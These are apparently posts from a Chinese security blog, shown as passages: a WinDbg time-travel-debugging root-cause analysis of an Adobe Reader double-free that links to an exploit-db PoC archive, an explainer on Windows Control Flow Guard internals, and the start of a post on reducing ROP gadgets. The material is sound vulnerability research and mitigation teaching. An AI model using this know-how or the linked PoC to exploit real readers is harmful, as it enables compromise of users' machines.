20FB5D:162 [Translate Position] SystemTimeStart : Unexpected failure to dereference object TimeEnd : 20FB5E:90 [Translate Position] SystemTimeEnd : Unexpected failure to dereference object Function : MSVCR120!malloc FunctionAddress : 0x6b1bed30 ReturnAddress : 0x69bf3042 ReturnValue : 0x1fb1c850 [Type: void *] Parameters 或者直接点击那是个中括号的值（点击的话中括号的会变成十进制的） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455560:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[143870]@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[143870] EventType : 0x0 ThreadId : 0x146c UniqueThreadId : 0x8 TimeStart : 20FB5D:162 [Translate Position] SystemTimeStart : Unexpected failure to dereference object TimeEnd : 20FB5E:90 [Translate Position] SystemTimeEnd : Unexpected failure to dereference object Function : MSVCR120!malloc FunctionAddress : 0x6b1bed30 ReturnAddress : 0x69bf3042 ReturnValue : 0x1fb1c850 [Type: void *] Parameters 0:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[235803]@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[235803] EventType : 0x0 ThreadId : 0x13a0 UniqueThreadId : 0x3 TimeStart : 1EA482:1C1 [Translate Position] SystemTimeStart : Unexpected failure to dereference object TimeEnd : 1EA483:90 [Translate Position] SystemTimeEnd : Unexpected failure to dereference object Function : MSVCR120!malloc FunctionAddress : 0x6b1bed30 ReturnAddress : 0x68b49911 ReturnValue : 0x1fb1c850 [Type: void *] Parameters 0:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[248102]@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[248102] EventType : 0x0 ThreadId : 0x13a0 UniqueThreadId : 0x3 TimeStart : 1F94B3:D6 [Translate Position] SystemTimeStart : Unexpected failure to dereference object TimeEnd : 1F94B4:90 [Translate Position] SystemTimeEnd : Unexpected failure to dereference object Function : MSVCR120!malloc FunctionAddress : 0x6b1bed30 ReturnAddress : 0x68b49911 ReturnValue : 0x1fb1c850 [Type: void *] Parameters 0:001&gt; dx -r1 @$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[254981]@$cursession.TTD.Calls(&quot;MSVCR120!malloc&quot;).Where(c =&gt; c.ReturnValue == (void *)0x1fb1c850)[254981] EventType : 0x0 ThreadId : 0x13a0 UniqueThreadId : 0x3 TimeStart : 2201C5:62 [Translate Position] SystemTimeStart : Unexpected failure to dereference object TimeEnd : 2201C6:90 [Translate Position] SystemTimeEnd : Unexpected failure to dereference object Function : MSVCR120!malloc FunctionAddress : 0x6b1bed30 ReturnAddress : 0x6a17cd10 ReturnValue : 0x1fb1c850 [Type: void *] Parameters 写入0x80的时间是Time Travel Position: 222B02:B（第一次free），所以malloc应该在他前面且最近的一次 上面四个分别是下面的，所以最近的应该是最后一个 1234567TimeStart : 20FB5D:162 [Translate Position] TimeStart : 1EA482:1C1 [Translate Position] TimeStart : 1F94B3:D6 [Translate Position] TimeStart : 2201C5:62 [Translate Positio 跟参考文章作者得出的一样，只不过那个中括号的排序可能有所差异 感觉这样还没有条件记录断点方便，但是还是挺清晰的 跟踪free 到上面写入0x80这，我们已经在第一次free的里面了 向上回溯，到第一次调用free的地方（AcroRd32!AcroWinBrowserMain+0x2593里面会调用MSVCR120!free） 123456789100:001&gt; p-Time Travel Position: 222B01:43**** WARNING loaded *kernel* extension dll for usermodeeax=1fb1c850 ebx=00000000 ecx=1fb1c7f0 edx=00000000 esi=1fb1c400 edi=00000000eip=6a18b291 esp=010cda00 ebp=010cdb0c iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c6d:6a18b291 e821eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7) 而我们看看现在代码上下，发现两次调用了AcroRd32!AcroWinBrowserMain+0x2593 12345678910116a18b286 8b8568ffffff mov eax, dword ptr [ebp-98h]6a18b28c 85c0 test eax, eax6a18b28e 7407 je AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c73 (6a18b297)6a18b290 50 push eax6a18b291 e821eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7) 6a18b296 59 pop ecx6a18b297 8b8570ffffff mov eax, dword ptr [ebp-90h]6a18b29d 85c0 test eax, eax6a18b29f 7407 je AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c84 (6a18b2a8)6a18b2a1 50 push eax6a18b2a2 e810eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7) 我们向下执行（记得将写入断点禁用），看看是不是 12345678910116a18b286 8b8568ffffff mov eax, dword ptr [ebp-98h]6a18b28c 85c0 test eax, eax6a18b28e 7407 je AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c73 (6a18b297)6a18b290 50 push eax6a18b291 e821eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7)6a18b296 59 pop ecx6a18b297 8b8570ffffff mov eax, dword ptr [ebp-90h] ss:002b:010cda7c=1fb1c8506a18b29d 85c0 test eax, eax6a18b29f 7407 je AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c84 (6a18b2a8)6a18b2a1 50 push eax6a18b2a2 e810eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7) 可以看到[ebp-90h]里面存的还是1fb1c850，那就明显free了两次了 看下内存更清晰 12340:001&gt; dd ebp-98 l4010cda74 1fb1c850 00000000 1fb1c850 000000180:001&gt; dd ebp-90 l4010cda7c 1fb1c850 00000018 00000000 00000000 最终在第二个 call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7) 里面崩溃，确实free两次了 123456789101112131415161718192021222324250:001&gt; pTime Travel Position: 222B02:3A**** WARNING loaded *kernel* extension dll for usermodeeax=1fb1c850 ebx=00000000 ecx=1fb1c850 edx=00000000 esi=1fb1c400 edi=00000000eip=6a18b2a2 esp=010cda00 ebp=010cdb0c iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206AcroRd32!CTJPEGTiledContentWriter::operator=+0x12c7e:6a18b2a2 e810eea6ff call AcroRd32!AcroWinBrowserMain+0x2593 (69bfa0b7)0:001&gt; p(2dc.13a0): Unknown exception - code c0000374 (first/second chance not available)**** WARNING loaded *kernel* extension dll for usermodeTTD: End of trace reached.(2dc.13a0): Break instruction exception - code 80000003 (first/second chance not available)**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 224FB2:1eax=000d0004 ebx=00000000 ecx=ffffd8f0 edx=770d2330 esi=00003a98 edi=00000000eip=67ce7001 esp=010cc25c ebp=010cc2a8 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=0000024667ce7001 0970ce or dword ptr [eax-32h],esi ds:002b:000cffd2=???????? 那么这个[ebp-98h]和[ebp-90h]从哪里来的呢，由于这个是4字节的，我下一个4字节的写入断点 12345678910111213141516171819202122232425262728293031323334353637383940414243440:001&gt; ba w4 010cda740:001&gt; ba w4 010cda7c0:001&gt; g-Breakpoint 4 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222B00:1AD3eax=1fb1c850 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac78 esp=010cda04 ebp=010cdb0c iopl=0 nv up ei pl nz ac po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212AcroRd32!CTJPEGTiledContentWriter::operator=+0x12654:6a18ac78 8d45a8 lea eax,[ebp-58h]0:001&gt; p-Time Travel Position: 222B00:1AD2**** WARNING loaded *kernel* extension dll for usermodeeax=1fb1c850 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac72 esp=010cda04 ebp=010cdb0c iopl=0 nv up ei pl nz ac po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212AcroRd32!CTJPEGTiledContentWriter::operator=+0x1264e:6a18ac72 898570ffffff mov dword ptr [ebp-90h],eax ss:002b:010cda7c=0000077f0:001&gt; g-Breakpoint 3 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222B00:1AA4eax=1fb1c850 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac5f esp=010cd9cc ebp=010cdb0c iopl=0 nv up ei ng nz na pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000287AcroRd32!CTJPEGTiledContentWriter::operator=+0x1263b:6a18ac5f 6a0f push 0Fh0:001&gt; p-Time Travel Position: 222B00:1AA3**** WARNING loaded *kernel* extension dll for usermodeeax=1fb1c850 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac59 esp=010cd9cc ebp=010cdb0c iopl=0 nv up ei ng nz na pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000287AcroRd32!CTJPEGTiledContentWriter::operator=+0x12635:6a18ac59 898568ffffff mov dword ptr [ebp-98h],eax ss:002b:010cda74=1ff69498 这两个代码很接近，我们看看上下文 12345678910111213141516171819206a18ac3f 56 push esi6a18ac40 53 push ebx6a18ac41 6a0f push 0Fh6a18ac43 89855cffffff mov dword ptr [ebp-0A4h], eax6a18ac49 8d45a8 lea eax, [ebp-58h]6a18ac4c 6a0e push 0Eh6a18ac4e 50 push eax6a18ac4f ff75e4 push dword ptr [ebp-1Ch]6a18ac52 e88e060000 call AcroRd32!CTJPEGTiledContentWriter::operator=+0x12cc1 (6a18b2e5)6a18ac57 56 push esi6a18ac58 53 push ebx6a18ac59 898568ffffff mov dword ptr [ebp-98h], eax ss:002b:010cda74=1ff694986a18ac5f 6a0f push 0Fh6a18ac61 6a0e push 0Eh6a18ac63 8d45a8 lea eax, [ebp-58h]6a18ac66 50 push eax6a18ac67 ff75e5 push dword ptr [ebp-1Bh]6a18ac6a e876060000 call AcroRd32!CTJPEGTiledContentWriter::operator=+0x12cc1 (6a18b2e5)6a18ac6f 83c448 add esp, 48h6a18ac72 898570ffffff mov dword ptr [ebp-90h], eax 这个函数其实是GetMemoryBlock函数 123456789101112131415161718192021222324252627282930313233343536undefined4GetMemoryBlock(undefined4 memory_block_type,int *param_2,byte offsetVal1,byte offsetVal2, undefined4 offsetVal3,int param_6) &#123; undefined4 retVal; int memory_block_base; byte offset; code *pcVar1; if ((char)memory_block_type == &apos;\\x03&apos;) &#123; if ((param_2 == (int *)0x0) || (param_6 == 0)) &#123;exception: CallThrowException(0x40000003,0); memory_block_type = 0; _CxxThrowException(&amp;memory_block_type,0x7472e75c); pcVar1 = (code *)swi(3); retVal = (*pcVar1)(); return retVal; &#125; *param_2 = *param_2 + 1; retVal = RetrieveMemoryBlock(param_6,*param_2 + -1); &#125; else &#123; offset = offsetVal1; if (((char)memory_block_type != &apos;\\0&apos;) &amp;&amp; (offset = offsetVal2, (char)memory_block_type != &apos;\\x01&apos;)) &#123; if ((char)memory_block_type != &apos;\\x02&apos;) goto exception; offset = (byte)offsetVal3; &#125; if (offset == 0) goto exception; memory_block_base = (*_TlsGetValueStub)(_dwTlsIndexForMemoryBlockBase); retVal = *(undefined4 *)(memory_block_base + 0x20 + (uint)offset * 4); &#125; return retVal;&#125; 我们看看两次调用的6个参数 123456789101112131415161718192021222324eax=010cdab4 ebx=00000000 ecx=1fb1c700 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac52 esp=010cd9d4 ebp=010cdb0c iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246AcroRd32!CTJPEGTiledContentWriter::operator=+0x1262e:6a18ac52 e88e060000 call AcroRd32!CTJPEGTiledContentWriter::operator=+0x12cc1 (6a18b2e5)0:001&gt; dds esp l6010cd9d4 01000000010cd9d8 010cdab4010cd9dc 0000000e010cd9e0 0000000f010cd9e4 00000000010cd9e8 1fb1c700eax=010cdab4 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac6a esp=010cd9bc ebp=010cdb0c iopl=0 nv up ei ng nz na pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000287AcroRd32!CTJPEGTiledContentWriter::operator=+0x12646:6a18ac6a e876060000 call AcroRd32!CTJPEGTiledContentWriter::operator=+0x12cc1 (6a18b2e5)0:001&gt; dds esp l6010cd9bc 00010000010cd9c0 010cdab4010cd9c4 0000000e010cd9c8 0000000f010cd9cc 00000000010cd9d0 1fb1c700 可以看到两次调用，只是第一个参数不一样，第一次是0x01000000，第二次是0x00010000，但是返回结果是一样的，而函数GetMemoryBlock里面是将memory_block_type强制转为char进行处理的，所以他们都是0x00,导致返回结果一样。 执行的是else部分代码 1234567891011else &#123; offset = offsetVal1; if (((char)memory_block_type != &apos;\\0&apos;) &amp;&amp; (offset = offsetVal2, (char)memory_block_type != &apos;\\x01&apos;)) &#123; if ((char)memory_block_type != &apos;\\x02&apos;) goto exception; offset = (byte)offsetVal3; &#125; if (offset == 0) goto exception; memory_block_base = (*_TlsGetValueStub)(_dwTlsIndexForMemoryBlockBase); retVal = *(undefined4 *)(memory_block_base + 0x20 + (uint)offset * 4); &#125; 最终offset = offsetVal1 = 0x0000000e而retVal = *(memory_block_base + 0x20 + (uint)offset * 4 = 0x016afde0 + 0x20 + 0x0000000e * 4) = *(0x16afe38) 我们看看这个地址的值，的确是0x1fb1c850 120:001&gt; dd 0x16afe38 l1016afe38 1fb1c850 跟踪0x00010000来源 12345eax=010cdab4 ebx=00000000 ecx=016afde0 edx=00000003 esi=1fb1c700 edi=00000000eip=6a18ac67 esp=010cd9c0 ebp=010cdb0c iopl=0 nv up ei ng nz na pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000287AcroRd32!CTJPEGTiledContentWriter::operator=+0x12643:6a18ac67 ff75e5 push dword ptr [ebp-1Bh] ss:002b:010cdaf1=00010000 对 [ebp-1Bh]下吸入断点 1234567891011120:001&gt; ba w1 010cdaf10:001&gt; g-Breakpoint 5 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222B00:19AEeax=00000000 ebx=1fbad818 ecx=00000002 edx=010cdb7c esi=010cdb54 edi=010cdaf4eip=6a18ab57 esp=010cda04 ebp=010cdb0c iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246AcroRd32!CTJPEGTiledContentWriter::operator=+0x12533:6a18ab57 f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 这里是010cdb54指向的值吸入010cdaf4，那么010cdaf1就来源于010cdb51，看了下确实是0x00010000 120:001&gt; dd 010cdb51 l1010cdb51 00010000 继续不断下硬件写入断点，跟踪010cdb51，来源于0x010cdbd1， 1234567891011121314151617181920212223240:001&gt; ba w1 010cdb510:001&gt; g-Breakpoint 6 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222B00:197Ceax=010cdb7c ebx=1fbad818 ecx=00000002 edx=00000003 esi=010cdbd4 edi=010cdb54eip=6a17bc8e esp=010cdb18 ebp=010cdcd4 iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206AcroRd32!CTJPEGTiledContentWriter::operator=+0x366a:6a17bc8e f3a5 rep movs dword ptr es:[edi],dword ptr [esi]0:001&gt; ba w1 010cdbd10:001&gt; g-Breakpoint 7 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222AAF:140eax=1fb1c700 ebx=1fbad818 ecx=00000502 edx=00000666 esi=0000000f edi=00000001eip=6a17b868 esp=010cdb6c ebp=010cdcd4 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202AcroRd32!CTJPEGTiledContentWriter::operator=+0x3244:6a17b868 8a437e mov al,byte ptr [ebx+7Eh] ds:002b:1fbad896=00 这个往上看看，写入的00来源于0x1fbad895 1236a17b85f 8a437d mov al, byte ptr [ebx+7Dh] ds:002b:1fbad895=006a17b862 8885fdfeffff mov byte ptr [ebp-103h], al6a17b868 8a437e mov al, byte ptr [ebx+7Eh] 后面有两个字节来源于别处，而且都是0 12345a17b86b 8885fefeffff mov byte ptr [ebp-102h], al6a17b871 668b8380000000 mov ax, word ptr [ebx+80h]6a17b878 899538ffffff mov dword ptr [ebp-0C8h], edx6a17b87e 8995d8feffff mov dword ptr [ebp-128h], edx6a17b884 66898500ffffff mov word ptr [ebp-100h], ax 只有ebp-101没被修改，而这里本来就是01了 120:001&gt; db ebp-101 l1010cdbd3 01 而我们关注的是最低字节，继续看看1fbad895的写入 1234567891011120:001&gt; ba w1 1fbad8950:001&gt; g-Breakpoint 8 hit**** WARNING loaded *kernel* extension dll for usermodeTime Travel Position: 222AAB:7F5eax=00000000 ebx=00000003 ecx=000000ff edx=0763beae esi=1fbad818 edi=1fb39030eip=6a17be59 esp=010cdb60 ebp=010cdcd4 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246AcroRd32!CTJPEGTiledContentWriter::operator=+0x3835:6a17be59 8bc1 mov eax,ecx 向上看 123456789101112131415161718192021222324252627286a17be18 e809d5ffff call AcroRd32!CTJPEGTiledContentWriter::operator=+0xd02 (6a179326)6a17be1d 0fb7c8 movzx ecx, ax---------------------------------------- 下面的中间的代码可以忽略了，就是上面call返回值给到ecx6a17be20 8ac1 mov al, cl6a17be22 22c3 and al, bl6a17be24 884678 mov byte ptr [esi+78h], al6a17be27 8ac1 mov al, cl6a17be29 c0e802 shr al, 26a17be2c 22c3 and al, bl6a17be2e 884679 mov byte ptr [esi+79h], al6a17be31 8ac1 mov al, cl6a17be33 c0e804 shr al, 46a17be36 22c3 and al, bl6a17be38 88467a mov byte ptr [esi+7Ah], al6a17be3b 8ac1 mov al, cl6a17be3d c0e806 shr al, 66a17be40 22c3 and al, bl6a17be42 88467b mov byte ptr [esi+7Bh], al6a17be45 8bc1 mov eax, ecx6a17be47 c1e808 shr eax, 86a17be4a 22c3 and al, bl6a17be4c 88467c mov byte ptr [esi+7Ch], al----------------------------------------ecx给到eax做些运算写入1fbad8956a17be4f 8bc1 mov eax, ecx6a17be51 c1e80a shr eax, 0Ah6a17be54 22c3 and al, bl6a17be56 88467d mov byte ptr [esi+7Dh], al6a17be59 8bc1 mov eax, ecx 上面说明分析看出来源于call AcroRd32!CTJPEGTiledContentWriter::operator=+0xd02 (6a179326)的返回值，跟进去看看，分析可以看出实际来源于0x0763beac 12345678910111213141516171819202122236a179358 0fb608 movzx ecx, byte ptr [eax] ds:002b:0763beac=006a17935b 8d5001 lea edx, [eax+1]6a17935e 8917 mov dword ptr [edi], edx6a179360 83fe01 cmp esi, 16a179363 760f jbe AcroRd32!CTJPEGTiledContentWriter::operator=+0xd50 (6a179374)6a179365 4e dec esi6a179366 0fb602 movzx eax, byte ptr [edx] ;eax来源于edx,即上面6a17935b的[eax+1]6a179369 c1e108 shl ecx, 86a17936c 03c8 add ecx, eax ;ecx来源于跟eax运算，ecx又来源于6a179358的[eax] 6a17936e 42 inc edx6a17936f 8917 mov dword ptr [edi], edx6a179371 4e dec esi6a179372 75f2 jne AcroRd32!CTJPEGTiledContentWriter::operator=+0xd42 (6a179366)6a179374 8bc1 mov eax, ecx ;eax来源于ecx6a179376 eb03 jmp AcroRd32!CTJPEGTiledContentWriter::operator=+0xd57 (6a17937b) ;跳到6a17937b----下面两行没执行6a179378 6a0a push 0Ah6a17937a 58 pop eax6a17937b 5f pop edi6a17937c 5e pop esi6a17937d 5d pop ebp6a17937e c20400 ret 4 看看里面 1234567890:001&gt; db 0763beac0763beac 00 ff 00 00 05 63 20 00-77 65 55 23 00 00 00 00 .....c .weU#....0763bebc 00 00 00 00 00 00 43 4e-70 39 0f 76 71 19 85 50 ......CNp9.vq..P0763becc 21 02 54 9e a2 43 da 0e-04 08 12 96 10 95 4a 64 !.T..C........Jd0763bedc a2 04 d0 33 43 4a e4 d0-be 9d 96 4d 66 b6 78 21 ...3CJ.....Mf.x!0763beec f1 f5 90 24 3d e3 81 2c-e5 30 92 a9 44 ad ee 8a ...$=..,.0..D...0763befc 97 ff 07 48 4b 79 a1 7d-3d 44 16 76 9e 4e 84 68 ...HKy.&#125;=D.v.N.h0763bf0c 9a 06 5a cc 34 14 a6 68-69 c7 fd 1f fe ae 63 64 ..Z.4..hi.....cd0763bf1c 93 ef ff c2 02 45 3e 20-db 34 0f f0 98 55 e8 12 .....E&gt; .4...U.. 通过ba w1 0763beac，发现0x0763beac来源于0x0746ba24，之后就不知道0x0746ba24来源于什么的 而0763beac我们也在poc中找到了这段内容，那这就是从文件读取进来的了 最终再看这张图就很清晰了 总结漏洞就是经过读取文件，计算，调用GetMemoryBlock，由于最低位都是00，导致获取的指针都指向同一个内存（文中的0x1fb1c850），而free的时候就free两次了。 TTD虽然优点很明显1、可以无poc，无环境调试漏洞，可以团队协作共享2、地址都是不变的3、能够”时间穿梭” 缺点1、假如程序过大，跟踪文件可能很大，而且调试也是比较占用内存的2、原始调试者的本地目录可能随着分享的跟踪文件而泄露 参考https://darungrim.com/research/2019-10-10-vulnerability-root-cause-analysis-with-time-travel-debugging.htmlhttps://www.exploit-db.com/exploits/47279https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47279.zip","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"windbg","slug":"windbg","permalink":"https://www.giantbranch.cn/tags/windbg/"}]},{"title":"CFG防护机制简单实践与介绍","slug":"CFG防护机制简单实践与介绍","date":"2019-10-28T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2019/10/28/CFG防护机制简单实践与介绍/","link":"","permalink":"https://www.giantbranch.cn/2019/10/28/CFG防护机制简单实践与介绍/","excerpt":"","text":"简介Control Flow Guard（CFG）是较新的windows漏洞利用缓解措施，旨在解决内存损坏漏洞。 针对的是间接跳转的保护，比如call eax，jmp eax等。 CFG扩展了先前的漏洞缓解技术，例如GS，DEP和ASLR。 这个保护措施从Microsoft Visual Studio 2015及以上开始支持。 系统的话是从windows 8.1开始吧 简单来说就是在call eax等间接跳转之前加个验证。 实践使用的示例代码 123456789101112131415161718192021typedef int(*fun_t)(int);int foo(int a)&#123; printf(&quot;hellow world %d\\n&quot;,a); return a;&#125;class CTargetObject&#123;public: fun_t fun;&#125;;int main()&#123; int i = 0; CTargetObject *o_array = new CTargetObject[5]; for (i = 0; i &lt; 5 ; i++) o_array[i].fun = foo; o_array[0].fun(1); return 0;&#125; 修改编译选项 上面改了可能报错： 命令行 error D8016: “/ZI”和“/guard:cf”命令行选项不兼容 就是CFG与这个ZI不兼容，所以我们得关闭ZI 编译完成我们可以使用winchecksec工具查看是否开启了CFG https://github.com/trailofbits/winchecksec 或者使用VS自带的工具dumpbin.exe，命令如下： 1dumpbin.exe /headers /loadconfig E:\\VS2017\\learnCFG\\Debug\\learnCFG.exe 开启了CFG，OPTIONAL HEADER VALUES里面应该有Control Flow Guard Section contains the following load config那里有“CF Instrumented”和“FID table present”等 我们看看开了CFG和没有开的区别 首先是没开的 接下来是开了的 双击跟过去那个检查函数是没有代码的，这应该是运行程序的时候再填充了 运行时，实际调用的是下面的ntdll!LdrpValidateUserCallTarget 原理分析首先说说CFGBitmap pCFG检查基于CFGBitmap，它表示在进程空间内所有函数的起始位置。在进程空间内每8个字节的状态对应CFGBitmap中的一位。如果函数的地址是合法有效的，那么这个函数对应在CFGbitmap的位置会被设置位1，否则是0。 p p一个Bitmap的大小是4字节 下面以地址0x00b01030为例（这是先知参考文章的例子） 具体调试结果跟解析如下了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051ntdll!LdrpValidateUserCallTarget:77408be0 8b15f8124a77 mov edx,dword ptr [ntdll!LdrSystemDllInitBlock+0xb0 (774a12f8)] ds:002b:774a12f8=00730000;获取CFGBitmap基址77408be6 8bc1 mov eax,ecx ;ecx为要检验的函数地址，给到eax (ecx=007113a0)77408be8 c1e808 shr eax,8 ;取地址的高3个字节 (eax = 00007113)ntdll!LdrpValidateUserCallTargetBitMapCheck:77408beb 8b1482 mov edx,dword ptr [edx+eax*4] ds:002b:0074c44c=10100444 ;获取该地址对应的bitmap 77408bee 8bc1 mov eax,ecx77408bf0 c1e803 shr eax,3 ;舍弃最低3个bit77408bf3 f6c10f test cl,0Fh ;判断目标地址是否以0x10对齐，跟0xf与运算，判断是否等于 077408bf6 7506 jne ntdll!LdrpValidateUserCallTargetBitMapRet+0x1 (77408bfe) ;不等于0则跳转到77408bfe; bt系列指令它们的结果影响CF标志位;BT:把指定位传送给CF；;BTC:把指定位传送给CF后还使该位变反；;BTR:把指定位传送给CF后还使该位变为0；;BTS:把指定位传送给CF后还使该位变为1;77408bf8 0fa3c2 bt edx,eax ;将edx的第eax位，给到CF（其实bt指令最多取eax的低5个bit）;假如bt的第二个参数很大，32位取低3bit，64位取低5bit，参考http://faydoc.tripod.com/cpu/bt.htm的Description的第二段;edx为00010000 00010000 00000100 01000100，eax的最低5bit为10100，即20，可以看到索引20位置为1，置CF为1，所以是有效的77408bfb 730a jae ntdll!LdrpValidateUserCallTargetBitMapRet+0xa (77408c07) ;CF等于0才跳ntdll!LdrpValidateUserCallTargetBitMapRet:77408bfd c3 ret ;正常情况下在这就返回执行正常代码了77408bfe 0fbaf000 btr eax,0 ;跟0x10不对齐跳到这，将eax的最低bit给到CF，之后将最低bit置077408c02 0fa3c2 bt edx,eax ;跟上面的一样，取低5bit作为edx的bit的索引，给到CF77408c05 7309 jae ntdll!LdrpValidateUserCallTargetBitMapRet+0x13 (77408c10) ;这就跳到失败的流程了77408c07 83c801 or eax,1 ;上面77408bfb判断无效后，来到这将eax最低位置1后再判断77408c0a 0fa3c2 bt edx,eax77408c0d 7301 jae ntdll!LdrpValidateUserCallTargetBitMapRet+0x13 (77408c10) ;这就跳到失败的流程了77408c0f c3 ret77408c10 51 push ecx77408c11 8d642480 lea esp,[esp-80h]77408c15 0f110424 movups xmmword ptr [esp],xmm077408c19 0f114c2410 movups xmmword ptr [esp+10h],xmm177408c1e 0f11542420 movups xmmword ptr [esp+20h],xmm277408c23 0f115c2430 movups xmmword ptr [esp+30h],xmm377408c28 0f11642440 movups xmmword ptr [esp+40h],xmm477408c2d 0f116c2450 movups xmmword ptr [esp+50h],xmm577408c32 0f11742460 movups xmmword ptr [esp+60h],xmm677408c37 0f117c2470 movups xmmword ptr [esp+70h],xmm777408c3c e8e7460500 call ntdll!RtlpHandleInvalidUserCallTarget (7745d328)77408c41 0f100424 movups xmm0,xmmword ptr [esp]77408c45 0f104c2410 movups xmm1,xmmword ptr [esp+10h]77408c4a 0f10542420 movups xmm2,xmmword ptr [esp+20h]77408c4f 0f105c2430 movups xmm3,xmmword ptr [esp+30h]77408c54 0f10642440 movups xmm4,xmmword ptr [esp+40h]77408c59 0f106c2450 movups xmm5,xmmword ptr [esp+50h]77408c5e 0f10742460 movups xmm6,xmmword ptr [esp+60h]77408c63 0f107c2470 movups xmm7,xmmword ptr [esp+70h]77408c68 8da42480000000 lea esp,[esp+80h]77408c6f 59 pop ecx77408c70 c3 ret 那么最终假如校验失败，那就会跳到 177408c3c e8e7460500 call ntdll!RtlpHandleInvalidUserCallTarget (7745d328) 最终int 0x29抛出异常 参考https://blog.trendmicro.com/trendlabs-security-intelligence/exploring-control-flow-guard-in-windows-10/https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guardhttps://xz.aliyun.com/t/2587https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard#how-do-i-tell-that-a-binary-is-under-control-flow-guard","categories":[],"tags":[{"name":"CFG","slug":"CFG","permalink":"https://www.giantbranch.cn/tags/CFG/"},{"name":"Control Flow Guard","slug":"Control-Flow-Guard","permalink":"https://www.giantbranch.cn/tags/Control-Flow-Guard/"}]},{"title":"ROP攻击缓解新思路——减少ROP Gadgets的数量","slug":"ROP攻击缓解新思路——减少ROP Gadgets的数量","date":"2019-10-28T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2019/10/28/ROP攻击缓解新思路——减少ROP Gadgets的数量/","link":"","permalink":"https://www.giantbranch.cn/2019/10/28/ROP攻击缓解新思路——减少ROP Gadgets的数量/","excerpt":"","text":"在今天的玄武实验室的安全推送中，看到了Removing ROP Gadgets from OpenBSD这个议题的PPT，一开始看了下标题，感觉有点疑惑，但是没马上看，后来下午抽实践看了看，感觉这个操作还是可以的。 注意下面针对的是系统是OpenBSD，而且是kernel，思路值得借鉴 这个我之前没看到过，所以把它叫做新思路 ROP简介说到ROP就得说说ROP Gadgets ROP Gadgets就是汇编代码中的片段，一般是ret或者jmp结尾的 他们可能完成下面的一些功能：1、寄存器赋值2、给寄存器加上一个数3、寄存器置04、调用函数5、改变esp的指向6、。。。。。。 ROP Gadgets还可以分为对齐的，还有不对齐的，不对其就是地址偏移了 比如下面的 18a 5d c3 movb -61(%rbp), %bl 但是假如你将汇编解析的起始地址指向5d的位置，那么汇编的意思就变了 125d popq 